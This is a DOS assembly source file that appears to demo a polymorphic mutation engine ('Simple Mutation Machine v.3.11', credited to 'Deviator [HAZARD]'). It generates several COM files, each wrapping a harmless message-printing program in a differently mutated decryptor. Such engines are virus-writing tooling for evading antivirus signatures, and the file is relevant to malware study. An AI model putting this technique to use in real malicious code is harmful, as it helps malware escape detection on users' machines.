.model tiny
.286
.code
    org 100h
main:
    call getbp
getbp:  pop bp
    sub bp,offset getbp

    mov ah,9
    lea dx,[mesg][bp]
    int 21h

    mov cx,9

    call randomize          ; this must do not in machine !
                    ; because decryptors generated
                    ; in small period of time would
                    ; be identical

    mov ds:[MaxGarb][Bp],10
    mov ds:[MinGarb][Bp],3
    mov ds:[AntiH1][Bp],1
generate:
    push cx
    lea di,[free][bp]
    lea si,[proggy][bp]
    mov cx,proggyl
    call smm
    push cx
    inc byte ptr cs:[fname][bp]
    mov ah,3ch
    lea dx,[fname][bp]
    xor cx,cx
    int 21h
    xchg ax,bx
    mov ah,40h
    pop cx
    lea dx,[free][bp]
    int 21h
    mov ah,3eh
    int 21h
    pop cx
    loop Generate
    int 20h

fname   db  '0.com',0

proggy: call rrr
rrr:    pop bp
    sub bp,offset rrr
    mov ah,9
    lea dx,[mes][bp]
    int 21h
    int 20h
mes db  'Simple Mutation Machine v.3.11 generated decryptor demo.',10,13
    db  ' Deviator [HAZARD]',10,13,'$'
proggyl equ $ - proggy
mesg    db  'Simple Mutation Machine v.3.11 Demo',10,13
    db  ' Deviator [HAZARD] ',10,13,'$'

include smm.asm
include smm.dat
free:
end main
